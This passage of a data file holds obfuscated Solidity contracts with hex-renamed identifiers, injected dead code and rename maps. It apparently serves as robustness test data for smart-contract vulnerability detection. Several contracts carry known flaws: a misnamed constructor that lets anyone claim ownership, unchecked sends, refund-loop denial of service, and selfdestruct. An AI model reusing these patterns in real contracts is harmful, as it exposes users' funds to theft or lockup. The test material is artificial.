        "balanceA": "_0x1c86ec",
        "_spender": "_0x5297fc",
        "balances": "_0x6be511",
        "isToken": "_0x5588b2",
        "allowed": "_0x689618",
        "_partyB": "_0xbdb336",
        "approve": "_0x817afa",
        "isClose": "_0xfa1b80",
        "_hexstr": "_0x7f4e90",
        "version": "_0x4221e6",
        "_partyA": "_0x47c02e",
        "_partyI": "_0xcfc1eb",
        "deposit": "_0x915bc1",
        "channel": "_0xa569fd",
        "bresult": "_0x27c717",
        "_VCroot": "_0x5bb43e",
        "success": "_0x953439",
        "cursor": "_0x2eb574",
        "partyA": "_0xdb41a1",
        "_proof": "_0xd37455",
        "prefix": "_0xcf9b4d",
        "isOpen": "_0x5d7ad6",
        "_owner": "_0xf47841",
        "partyI": "_0x1d9f6e",
        "_token": "_0xcc1087",
        "_value": "_0x34edf1",
        "_state": "_0xe2e099",
        "result": "_0xa76dc9",
        "symbol": "_0xc1dc75",
        "partyB": "_0x06fd6a",
        "vcRoot": "_0xb3f252",
        "_sigA": "_0xc767ea",
        "_lcID": "_0x0682e0",
        "_hash": "_0x187c6f",
        "_addr": "_0xd49535",
        "token": "_0x536d6a",
        "_sigI": "_0x3a8f81",
        "_bond": "_0x5032d9",
        "_from": "_0x44bc5f",
        "proof": "_0x3b3907",
        "_uint": "_0xc1668d",
        "_vcID": "_0x4beb3a",
        "_char": "_0xdbbe0f",
        "_root": "_0x5fb9d0",
        "bstr": "_0x66321e",
        "_sig": "_0x6cacb4",
        "_msg": "_0x767709",
        "bond": "_0x37214c",
        "_str": "_0x19c8fa",
        "vcId": "_0x0e6964",
        "lcId": "_0x821ca8",
        "sigA": "_0x630298",
        "name": "_0x7245fc",
        "now": "_0x7216b3",
        "_to": "_0x294f2c",
        "str": "_0xe80de5",
        "len": "_0xa673d2",
        "id": "_0xa1cbfb"
      },
      "changes": [
        "Renamed 141 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 44, column 9', 'Syntax error at line 45, column 9', 'Syntax error at line 167, column 1']"
    },
    {
      "original_id": "sn_ds_115",
      "transformed_id": "ss_l4_medium_sn_ds_115",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// https://etherscan.io/address/0x42d6622dece394b54999fbd73d108123806f6a18#code\n\n// Abstract contract for the full ERC 20 Token standard\n// https://github.com/ethereum/EIPs/issues/20\npragma solidity 0.4.15;\n\ncontract Token {\n    /// total amount of tokens\n    uint256 public _0x7f5e98;\n\n    /// @param _owner The address from which the balance will be retrieved\n    /// @return The balance\n    function _0x59216e(address _0xbd9dc5) constant returns (uint256 balance);\n\n    /// @notice send `_value` token to `_to` from `msg.sender`\n    /// @param _to The address of the recipient\n    /// @param _value The amount of token to be transferred\n    /// @return Whether the transfer was successful or not\n    function transfer(address _0x418f06, uint256 _0xc8eae2) returns (bool _0x89c131);\n\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n    /// @param _from The address of the sender\n    /// @param _to The address of the recipient\n    /// @param _value The amount of token to be transferred\n    /// @return Whether the transfer was successful or not\n    function _0xd79d95(address _0x8b00db, address _0x418f06, uint256 _0xc8eae2) returns (bool _0x89c131);\n\n    /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @param _value The amount of tokens to be approved for transfer\n    /// @return Whether the approval was successful or not\n    function _0x55c7bb(address _0xf353d4, uint256 _0xc8eae2) returns (bool _0x89c131);\n\n    /// @param _owner The address of the account owning tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @return Amount of remaining tokens allowed to spent\n    function _0x4509b8(address _0xbd9dc5, address _0xf353d4) constant returns (uint256 _0x8ebb48);\n\n    event Transfer(address indexed _0x8b00db, address indexed _0x418f06, uint256 _0xc8eae2);\n    event Approval(address indexed _0xbd9dc5, address indexed _0xf353d4, uint256 _0xc8eae2);\n}\n\ncontract StandardToken is Token {\n\n    function transfer(address _0x418f06, uint256 _0xc8eae2) returns (bool _0x89c131) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n        //Replace the if with this one instead.\n        //require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        require(_0x7bfedb[msg.sender] >= _0xc8eae2);\n        _0x7bfedb[msg.sender] -= _0xc8eae2;\n        _0x7bfedb[_0x418f06] += _0xc8eae2;\n        Transfer(msg.sender, _0x418f06, _0xc8eae2);\n        return true;\n    }\n\n    function _0xd79d95(address _0x8b00db, address _0x418f06, uint256 _0xc8eae2) returns (bool _0x89c131) {\n\n        //require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        require(_0x7bfedb[_0x8b00db] >= _0xc8eae2 && _0x18695f[_0x8b00db][msg.sender] >= _0xc8eae2);\n        _0x7bfedb[_0x418f06] += _0xc8eae2;\n        _0x7bfedb[_0x8b00db] -= _0xc8eae2;\n        _0x18695f[_0x8b00db][msg.sender] -= _0xc8eae2;\n        Transfer(_0x8b00db, _0x418f06, _0xc8eae2);\n        return true;\n    }\n\n    function _0x59216e(address _0xbd9dc5) constant returns (uint256 balance) {\n        return _0x7bfedb[_0xbd9dc5];\n    }\n\n    function _0x55c7bb(address _0xf353d4, uint256 _0xc8eae2) returns (bool _0x89c131) {\n        _0x18695f[msg.sender][_0xf353d4] = _0xc8eae2;\n        Approval(msg.sender, _0xf353d4, _0xc8eae2);\n        return true;\n    }\n\n    function _0x4509b8(address _0xbd9dc5, address _0xf353d4) constant returns (uint256 _0x8ebb48) {\n      return _0x18695f[_0xbd9dc5][_0xf353d4];\n    }\n\n    mapping (address => uint256) _0x7bfedb;\n    mapping (address => mapping (address => uint256)) _0x18695f;\n}\n\ncontract HumanStandardToken is StandardToken {\n\n    /* Public variables of the token */\n    string public _0x850470;                   //fancy name: eg Simon Bucks\n    uint8 public _0x28d29b;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n    string public _0xd8be24;                 //An identifier: eg SBX\n    string public _0xa87d58 = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\n\n    function HumanStandardToken(\n        uint256 _0x1d1788,\n        string _0xe286c7,\n        uint8 _0x5c39d2,\n        string _0x02dd87\n        ) {\n        _0x7bfedb[msg.sender] = _0x1d1788;               // Give the creator all initial tokens\n        _0x7f5e98 = _0x1d1788;                        // Update total supply\n        _0x850470 = _0xe286c7;                                   // Set the name for display purposes\n        _0x28d29b = _0x5c39d2;                            // Amount of decimals for display purposes\n        _0xd8be24 = _0x02dd87;                               // Set the symbol for display purposes\n    }\n\n    /* Approves and then calls the receiving contract */\n    function _0x8dc8fa(address _0xf353d4, uint256 _0xc8eae2, bytes _0xf6d223) returns (bool _0x89c131) {\n        _0x18695f[msg.sender][_0xf353d4] = _0xc8eae2;\n        Approval(msg.sender, _0xf353d4, _0xc8eae2);\n\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n        require(_0xf353d4.call(bytes4(bytes32(_0x4b70fd(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _0xc8eae2, this, _0xf6d223));\n        return true;\n    }\n}",
      "rename_map": {
        "_initialAmount": "_0x1d1788",
        "approveAndCall": "_0x8dc8fa",
        "_decimalUnits": "_0x5c39d2",
        "transferFrom": "_0xd79d95",
        "_tokenSymbol": "_0x02dd87",
        "totalSupply": "_0x7f5e98",
        "_extraData": "_0xf6d223",
        "_tokenName": "_0xe286c7",
        "balanceOf": "_0x59216e",
        "remaining": "_0x8ebb48",
        "allowance": "_0x4509b8",
        "_spender": "_0xf353d4",
        "decimals": "_0x28d29b",
        "balances": "_0x7bfedb",
        "version": "_0xa87d58",
        "approve": "_0x55c7bb",
        "allowed": "_0x18695f",
        "success": "_0x89c131",
        "_owner": "_0xbd9dc5",
        "_value": "_0xc8eae2",
        "symbol": "_0xd8be24",
        "_from": "_0x8b00db",
        "sha3": "_0x4b70fd",
        "name": "_0x850470",
        "_to": "_0x418f06"
      },
      "changes": [
        "Renamed 25 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_116",
      "transformed_id": "ss_l4_medium_sn_ds_116",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract Missing{\n    address private _0x6ec4b3;\n\n    modifier _0xc0de36 {\n        require(msg.sender==_0x6ec4b3);\n        _;\n    }\n\n    // The name of the constructor should be Missing\n\n    function IamMissing()\n        public\n    {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        _0x6ec4b3 = msg.sender;\n    }\n\n    function _0xf474f8()\n        public\n        _0xc0de36\n    {\n        bool _flag3 = false;\n        // Placeholder for future logic\n       _0x6ec4b3.transfer(this.balance);\n    }\n}",
      "rename_map": {
        "onlyowner": "_0xc0de36",
        "withdraw": "_0xf474f8",
        "owner": "_0x6ec4b3"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_117",
      "transformed_id": "ss_l4_medium_sn_ds_117",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// 0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code\npragma solidity ^0.4.15;\n\ncontract Rubixi {\n\n        //Declare variables for storage critical to contract\n        uint private balance = 0;\n        uint private _0x0982bf = 0;\n        uint private _0x3b04e7 = 10;\n        uint private _0x099e1d = 300;\n        uint private _0x3dd9ea = 0;\n\n        address private _0xf15b6e;\n\n        //Sets creator\n        function DynamicPyramid() {\n                if (block.timestamp > 0) { _0xf15b6e = msg.sender; }\n        }\n\n        modifier _0xfc5649 {\n                if (msg.sender == _0xf15b6e) _;\n        }\n\n        struct Participant {\n                address _0x1f35be;\n                uint _0xdefa9f;\n        }\n\n        Participant[] private _0xfb54b9;\n\n        //Fallback function\n        function() {\n                _0xa84aa9();\n        }\n\n        //init function run on fallback\n        function _0xa84aa9() private {\n        if (false) { revert(); }\n        bool _flag2 = false;\n                //Ensures only tx with value of 1 ether or greater are processed and added to pyramid\n                if (msg.value < 1 ether) {\n                        _0x0982bf += msg.value;\n                        return;\n                }\n\n                uint _0xc2e0a2 = _0x3b04e7;\n                //50% fee rebate on any ether value of 50 or greater\n                if (msg.value >= 50 ether) _0xc2e0a2 /= 2;\n\n                _0xa7a030(_0xc2e0a2);\n        }\n\n        //Function called for valid tx to the contract\n        function _0xa7a030(uint _0xc2e0a2) private {\n        bool _flag3 = false;\n        if (false) { revert(); }\n                //Adds new address to participant array\n                _0xfb54b9.push(Participant(msg.sender, (msg.value * _0x099e1d) / 100));\n\n                //These statements ensure a quicker payout system to later pyramid entrants, so the pyramid has a longer lifespan\n                if (_0xfb54b9.length == 10) _0x099e1d = 200;\n                else if (_0xfb54b9.length == 25) _0x099e1d = 150;\n\n                // collect fees and update contract balance\n                balance += (msg.value * (100 - _0xc2e0a2)) / 100;\n                _0x0982bf += (msg.value * _0xc2e0a2) / 100;\n\n                //Pays earlier participiants if balance sufficient\n                while (balance > _0xfb54b9[_0x3dd9ea]._0xdefa9f) {\n                        uint _0x971d5c = _0xfb54b9[_0x3dd9ea]._0xdefa9f;\n                        _0xfb54b9[_0x3dd9ea]._0x1f35be.send(_0x971d5c);\n\n                        balance -= _0xfb54b9[_0x3dd9ea]._0xdefa9f;\n                        _0x3dd9ea += 1;\n                }\n        }\n\n        //Fee functions for creator\n        function _0xb629fe() _0xfc5649 {\n                if (_0x0982bf == 0) throw;\n\n                _0xf15b6e.send(_0x0982bf);\n                _0x0982bf = 0;\n        }\n\n        function _0xbed1d4(uint _0x086eb8) _0xfc5649 {\n                _0x086eb8 *= 1 ether;\n                if (_0x086eb8 > _0x0982bf) _0xb629fe();\n\n                if (_0x0982bf == 0) throw;\n\n                _0xf15b6e.send(_0x086eb8);\n                _0x0982bf -= _0x086eb8;\n        }\n\n        function _0x3149fd(uint _0x789621) _0xfc5649 {\n                if (_0x0982bf == 0 || _0x789621 > 100) throw;\n\n                uint _0x72edbe = _0x0982bf / 100 * _0x789621;\n                _0xf15b6e.send(_0x72edbe);\n                _0x0982bf -= _0x72edbe;\n        }\n\n        //Functions for changing variables related to the contract\n        function _0xbe0ecc(address _0xe0932e) _0xfc5649 {\n                _0xf15b6e = _0xe0932e;\n        }\n\n        function _0x3d6dba(uint _0xc32425) _0xfc5649 {\n                if (_0xc32425 > 300 || _0xc32425 < 120) throw;\n\n                _0x099e1d = _0xc32425;\n        }\n\n        function _0x5e6e12(uint _0xc2e0a2) _0xfc5649 {\n                if (_0xc2e0a2 > 10) throw;\n\n                _0x3b04e7 = _0xc2e0a2;\n        }\n\n        //Functions to provide information to end-user using JSON interface or other interfaces\n        function _0x06460e() constant returns(uint _0x2c6b09, string _0xed60d2) {\n                if (gasleft() > 0) { _0x2c6b09 = _0x099e1d; }\n                _0xed60d2 = 'This _0x2c6b09 applies to you as soon as transaction is received, may be lowered to hasten payouts or increased if payouts are fast enough. Due to no float or decimals, _0x2c6b09 is x100 for a fractional _0x2c6b09 e.g. 250 is actually a 2.5x _0x2c6b09. Capped at 3x max and 1.2x min.';\n        }\n\n        function _0xc466b2() constant returns(uint _0x3342a1, string _0xed60d2) {\n                _0x3342a1 = _0x3b04e7;\n                if (msg.sender != address(0) || msg.sender == address(0)) { _0xed60d2 = 'Shown in % form. Fee is halved(50%) for amounts equal or greater than 50 ethers. (Fee may change, but is capped to a maximum of 10%)'; }\n        }\n\n        function _0x0cc67e() constant returns(uint _0x529a34, string _0xed60d2) {\n                _0x529a34 = balance / 1 ether;\n                _0xed60d2 = 'All balance values are measured in Ethers, note that due to no decimal placing, these values show up as integers only, within the contract itself you will get the exact decimal value you are supposed to';\n        }\n\n        function _0x8c402f() constant returns(uint _0x73a9d0) {\n                if (1 == 1) { _0x73a9d0 = _0xfb54b9[_0x3dd9ea]._0xdefa9f / 1 ether; }\n        }\n\n        function _0xd8947a() constant returns(uint _0x4d6d62) {\n                _0x4d6d62 = _0x0982bf / 1 ether;\n        }\n\n        function _0x9b5598() constant returns(uint _0xf738e7) {\n                _0xf738e7 = _0xfb54b9.length;\n        }\n\n        function _0x944140() constant returns(uint _0xf738e7) {\n                _0xf738e7 = _0xfb54b9.length - _0x3dd9ea;\n        }\n\n        function _0x859f1b(uint _0x46a11a) constant returns(address Address, uint Payout) {\n                if (_0x46a11a <= _0xfb54b9.length) {\n                        Address = _0xfb54b9[_0x46a11a]._0x1f35be;\n                        Payout = _0xfb54b9[_0x46a11a]._0xdefa9f / 1 ether;\n                }\n        }\n}",
      "rename_map": {
        "nextPayoutWhenPyramidBalanceTotalsApproximately": "_0x8c402f",
        "numberOfParticipantsWaitingForPayout": "_0x944140",
        "feesSeperateFromBalanceApproximately": "_0xd8947a",
        "currentPyramidBalanceApproximately": "_0x0cc67e",
        "currentFeePercentage": "_0xc466b2",
        "collectPercentOfFees": "_0x3149fd",
        "changeFeePercentage": "_0x5e6e12",
        "collectFeesInEther": "_0xbed1d4",
        "participantDetails": "_0x859f1b",
        "currentMultiplier": "_0x06460e",
        "pyramidMultiplier": "_0x099e1d",
        "totalParticipants": "_0x9b5598",
        "changeMultiplier": "_0x3d6dba",
        "orderInPyramid": "_0x46a11a",
        "collectAllFees": "_0xb629fe",
        "pyramidBalance": "_0x529a34",
        "feesToCollect": "_0x72edbe",
        "balancePayout": "_0x73a9d0",
        "collectedFees": "_0x0982bf",
        "participants": "_0xfb54b9",
        "payoutToSend": "_0x971d5c",
        "etherAddress": "_0x1f35be",
        "payoutOrder": "_0x3dd9ea",
        "changeOwner": "_0xbe0ecc",
        "multiplier": "_0x2c6b09",
        "feePercent": "_0x3b04e7",
        "addPayout": "_0xa7a030",
        "onlyowner": "_0xfc5649",
        "creator": "_0xf15b6e",
        "_owner": "_0xe0932e",
        "payout": "_0xdefa9f",
        "_pcent": "_0x789621",
        "count": "_0xf738e7",
        "_mult": "_0xc32425",
        "_fee": "_0xc2e0a2",
        "_amt": "_0x086eb8",
        "fees": "_0x4d6d62",
        "init": "_0xa84aa9",
        "info": "_0xed60d2",
        "fee": "_0x3342a1"
      },
      "changes": [
        "Renamed 40 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_118",
      "transformed_id": "ss_l4_medium_sn_ds_118",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "contract Destructible {\n  address _0x89043b;\n  function suicide() public returns (address) {\n        if (false) { revert(); }\n        if (false) { revert(); }\n    require(_0x89043b == msg.sender);\n    selfdestruct(_0x89043b);\n  }\n}\ncontract C is Destructible {\n  address _0x89043b;\n  function C() {\n    _0x89043b = msg.sender;\n  }\n}",
      "rename_map": {
        "owner": "_0x89043b"
      },
      "changes": [
        "Renamed 1 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_119",
      "transformed_id": "ss_l4_medium_sn_ds_119",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// A chain-game contract that maintains a 'throne' which agents may pay to rule.\n// See www.kingoftheether.com & https://github.com/kieranelby/KingOfTheEtherThrone .\n// (c) Kieran Elby 2016. All rights reserved.\n// v0.4.0.\n// Inspired by ethereumpyramid.com and the (now-gone?) \"magnificent bitcoin gem\".\n\n// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0\n// and was compiled (using optimization) with:\n// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum\n\n// For future versions it would be nice to ...\n// TODO - enforce time-limit on reign (can contracts do that without external action)?\n// TODO - add a random reset?\n// TODO - add bitcoin bridge so agents can pay in bitcoin?\n// TODO - maybe allow different return payment address?\npragma solidity ^0.4.19;\n\ncontract KingOfTheEtherThrone {\n\n    struct Monarch {\n        // Address to which their compensation will be sent.\n        address _0x305092;\n        // A name by which they wish to be known.\n        // NB: Unfortunately \"string\" seems to expose some bugs in web3.\n        string _0x632be1;\n        // How much did they pay to become monarch?\n        uint _0xda2dc4;\n        // When did their rule start (based on block.timestamp)?\n        uint _0xbb457b;\n    }\n\n    // The wizard is the hidden power behind the throne; they\n    // occupy the throne during gaps in succession and collect fees.\n    address _0x1904a6;\n\n    // Used to ensure only the wizard can do some things.\n    modifier _0x1fd5e4 { if (msg.sender == _0x1904a6) _; }\n\n    // How much must the first monarch pay?\n    uint constant _0x287a01 = 100 finney;\n\n    // The next claimPrice is calculated from the previous claimFee\n    // by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -\n    // for example, num=3 and den=2 would cause a 50% increase.\n    uint constant _0x616067 = 3;\n    uint constant _0x532c88 = 2;\n\n    // How much of each claimFee goes to the wizard (expressed as a fraction)?\n    // e.g. num=1 and den=100 would deduct 1% for the wizard, leaving 99% as\n    // the compensation fee for the usurped monarch.\n    uint constant _0x2cc1a2 = 1;\n    uint constant _0x3844b5 = 100;\n\n    // How much must an agent pay now to become the monarch?\n    uint public _0xb3e879;\n\n    // The King (or Queen) of the Ether.\n    Monarch public _0xdb090f;\n\n    // Earliest-first list of previous throne holders.\n    Monarch[] public _0x807c8a;\n\n    // Create a new throne, with the creator as wizard and first ruler.\n    // Sets up some hopefully sensible defaults.\n    function KingOfTheEtherThrone() {\n        _0x1904a6 = msg.sender;\n        _0xb3e879 = _0x287a01;\n        _0xdb090f = Monarch(\n            _0x1904a6,\n            \"[Vacant]\",\n            0,\n            block.timestamp\n        );\n    }\n\n    function _0xfa85f0() constant returns (uint n) {\n        return _0x807c8a.length;\n    }\n\n    // Fired when the throne is claimed.\n    // In theory can be used to help build a front-end.\n    event ThroneClaimed(\n        address _0xb53bb7,\n        string _0x6308b6,\n        uint _0x2f69eb\n    );\n\n    // Fallback function - simple transactions trigger this.\n    // Assume the message data is their desired name.\n    function() {\n        _0x66f26b(string(msg.data));\n    }\n\n    // Claim the throne for the given name by paying the currentClaimFee.\n    function _0x66f26b(string _0x632be1) {\n\n        uint _0xd1c72e = msg.value;\n\n        // If they paid too little, reject claim and refund their money.\n        if (_0xd1c72e < _0xb3e879) {\n            msg.sender.send(_0xd1c72e);\n            return;\n        }\n\n        // If they paid too much, continue with claim but refund the excess.\n        if (_0xd1c72e > _0xb3e879) {\n            uint _0x340619 = _0xd1c72e - _0xb3e879;\n            msg.sender.send(_0x340619);\n            _0xd1c72e = _0xd1c72e - _0x340619;\n        }\n\n        // The claim price payment goes to the current monarch as compensation\n        // (with a commission held back for the wizard). We let the wizard's\n        // payments accumulate to avoid wasting gas sending small fees.\n\n        uint _0xabfa1c = (_0xd1c72e * _0x2cc1a2) / _0x3844b5;\n\n        uint _0xbca35d = _0xd1c72e - _0xabfa1c;\n\n        if (_0xdb090f._0x305092 != _0x1904a6) {\n            _0xdb090f._0x305092.send(_0xbca35d);\n        } else {\n            // When the throne is vacant, the fee accumulates for the wizard.\n        }\n\n        // Usurp the current monarch, replacing them with the new one.\n        _0x807c8a.push(_0xdb090f);\n        _0xdb090f = Monarch(\n            msg.sender,\n            _0x632be1,\n            _0xd1c72e,\n            block.timestamp\n        );\n\n        // Increase the claim fee for next time.\n        // Stop number of trailing decimals getting silly - we round it a bit.\n        uint _0x34a43c = _0xb3e879 * _0x616067 / _0x532c88;\n        if (_0x34a43c < 10 finney) {\n            if (1 == 1) { _0xb3e879 = _0x34a43c; }\n        } else if (_0x34a43c < 100 finney) {\n            if (1 == 1) { _0xb3e879 = 100 szabo * (_0x34a43c / 100 szabo); }\n        } else if (_0x34a43c < 1 ether) {\n            _0xb3e879 = 1 finney * (_0x34a43c / 1 finney);\n        } else if (_0x34a43c < 10 ether) {\n            _0xb3e879 = 10 finney * (_0x34a43c / 10 finney);\n        } else if (_0x34a43c < 100 ether) {\n            _0xb3e879 = 100 finney * (_0x34a43c / 100 finney);\n        } else if (_0x34a43c < 1000 ether) {\n            _0xb3e879 = 1 ether * (_0x34a43c / 1 ether);\n        } else if (_0x34a43c < 10000 ether) {\n            if (1 == 1) { _0xb3e879 = 10 ether * (_0x34a43c / 10 ether); }\n        } else {\n            _0xb3e879 = _0x34a43c;\n        }\n\n        // Hail the new monarch!\n        ThroneClaimed(_0xdb090f._0x305092, _0xdb090f._0x632be1, _0xb3e879);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function _0x883ff5(uint _0xd79b5e) _0x1fd5e4 {\n        _0x1904a6.send(_0xd79b5e);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function _0x012747(address _0x0b2fcc) _0x1fd5e4 {\n        _0x1904a6 = _0x0b2fcc;\n    }\n\n}",
      "rename_map": {
        "wizardCommissionFractionNum": "_0x2cc1a2",
        "wizardCommissionFractionDen": "_0x3844b5",
        "claimPriceAdjustDen": "_0x532c88",
        "coronationTimestamp": "_0xbb457b",
        "usurperEtherAddress": "_0xb53bb7",
        "claimPriceAdjustNum": "_0x616067",
        "startingClaimPrice": "_0x287a01",
        "transferOwnership": "_0x012747",
        "currentClaimPrice": "_0xb3e879",
        "rawNewClaimPrice": "_0x34a43c",
        "numberOfMonarchs": "_0xfa85f0",
        "wizardCommission": "_0xabfa1c",
        "sweepCommission": "_0x883ff5",
        "currentMonarch": "_0xdb090f",
        "wizardAddress": "_0x1904a6",
        "newClaimPrice": "_0x2f69eb",
        "etherAddress": "_0x305092",
        "pastMonarchs": "_0x807c8a",
        "compensation": "_0xbca35d",
        "usurperName": "_0x6308b6",
        "claimThrone": "_0x66f26b",
        "onlywizard": "_0x1fd5e4",
        "claimPrice": "_0xda2dc4",
        "excessPaid": "_0x340619",
        "valuePaid": "_0xd1c72e",
        "newOwner": "_0x0b2fcc",
        "amount": "_0xd79b5e",
        "name": "_0x632be1"
      },
      "changes": [
        "Renamed 28 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_120",
      "transformed_id": "ss_l4_medium_sn_ds_120",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract CrowdFundBasic {\n  address[] private _0xc66b82;\n  mapping(address => uint) public _0x4b3936;\n\n  function _0xc0f7ee() public {\n        // Placeholder for future logic\n        bool _flag2 = false;\n    for(uint i; i < _0xc66b82.length; i++) {\n      require(_0xc66b82[i].transfer(_0x4b3936[_0xc66b82[i]]));\n    }\n  }\n}\n\ncontract CrowdFundPull {\n  address[] private _0xc66b82;\n  mapping(address => uint) public _0x4b3936;\n\n  function _0x243edd() external {\n        uint256 _unused3 = 0;\n        if (false) { revert(); }\n    uint _0xed85c7 = _0x4b3936[msg.sender];\n    _0x4b3936[msg.sender] = 0;\n    msg.sender.transfer(_0xed85c7);\n  }\n}\n\ncontract CrowdFundSafe {\n  address[] private _0xc66b82;\n  mapping(address => uint) public _0x4b3936;\n  uint256 _0x52f436;\n\n  function _0xeba900() public {\n    uint256 i = _0x52f436;\n    while(i < _0xc66b82.length && msg.gas > 200000) {\n      _0xc66b82[i].transfer(_0x4b3936[i]);\n      i++;\n    }\n    _0x52f436 = i;\n  }\n}",
      "rename_map": {
        "refundAddresses": "_0xc66b82",
        "refundAmount": "_0x4b3936",
        "refundSafe": "_0xeba900",
        "refundDos": "_0xc0f7ee",
        "withdraw": "_0x243edd",
        "nextIdx": "_0x52f436",
        "refund": "_0xed85c7"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_121",
      "transformed_id": "ss_l4_medium_sn_ds_121",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract SimpleAuction {\n  address _0xb54e7d;\n  uint _0xc71226;\n\n  function _0xb1a88e() payable {\n    require(msg.value > _0xc71226);\n\n    //If the refund fails, the entire transaction reverts.\n\n    if (_0xb54e7d != 0) {\n      //E.g. if recipients fallback function is just revert()\n      require(_0xb54e7d.send(_0xc71226));\n    }\n\n    _0xb54e7d = msg.sender;\n    _0xc71226         = msg.value;\n  }\n}\n\ncontract AuctionV2 {\n  address _0xb54e7d;\n  uint    _0xc71226;\n\n  mapping(address => uint) _0x85bb5d;\n\n  //Avoids \"pushing\" balance to users favoring \"pull\" architecture\n  function _0xb1a88e() payable external {\n    require(msg.value > _0xc71226);\n\n    if (_0xb54e7d != 0) {\n      _0x85bb5d[_0xb54e7d] += _0xc71226;\n    }\n\n    _0xb54e7d = msg.sender;\n    _0xc71226         = msg.value;\n  }\n\n  //Allows users to get their refund from auction\n  function _0x3b65f2() external {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n    //Do all state manipulation before external call to\n    uint _0xa2ad2a = _0x85bb5d[msg.sender];\n    _0x85bb5d[msg.sender] = 0;\n\n    msg.sender.send(_0xa2ad2a);\n  }\n}",
      "rename_map": {
        "currentFrontrunner": "_0xb54e7d",
        "currentBid": "_0xc71226",
        "withdraw": "_0x3b65f2",
        "refunds": "_0x85bb5d",
        "refund": "_0xa2ad2a",
        "bid": "_0xb1a88e"
      },
      "changes": [
        "Renamed 6 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_122",
      "transformed_id": "ss_l4_medium_sn_ds_122",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// 0xa657491c1e7f16adb39b9b60e87bbb8d93988bc3#code\n//sol Wallet\n// Multi-sig, daily-limited account proxy/wallet.\n// @authors:\n// Gav Wood <g@ethdev.com>\n// inheritable \"property\" contract that enables methods to be protected by requiring the acquiescence of either a\n// single, or, crucially, each of a number of, designated owners.\n// usage:\n// use modifiers onlyowner (just own owned) or onlymanyowners(hash), whereby the same hash must be provided by\n// some number (specified in constructor) of the set of owners (specified in the constructor, modifiable) before the\n// interior is executed.\n\npragma solidity ^0.4.9;\n\ncontract WalletEvents {\n  // EVENTS\n\n  // this contract only has six types of events: it can accept a confirmation, in which case\n  // we record owner and operation (hash) alongside it.\n  event Confirmation(address _0xc80af8, bytes32 _0x81628f);\n  event Revoke(address _0xc80af8, bytes32 _0x81628f);\n\n  // some others are in the case of an owner changing.\n  event OwnerChanged(address _0x285db7, address _0x373d8c);\n  event OwnerAdded(address _0x373d8c);\n  event OwnerRemoved(address _0x285db7);\n\n  // the last one is emitted if the required signatures change\n  event RequirementChanged(uint _0x554bb0);\n\n  // Funds has arrived into the wallet (record how much).\n  event Deposit(address _0xd80c42, uint value);\n  // Single transaction going out of the wallet (record who signed for it, how much, and to whom it's going).\n  event SingleTransact(address _0xc80af8, uint value, address _0x0c74f0, bytes data, address _0x595b20);\n  // Multi-sig transaction going out of the wallet (record who signed for it last, the operation hash, how much, and to whom it's going).\n  event MultiTransact(address _0xc80af8, 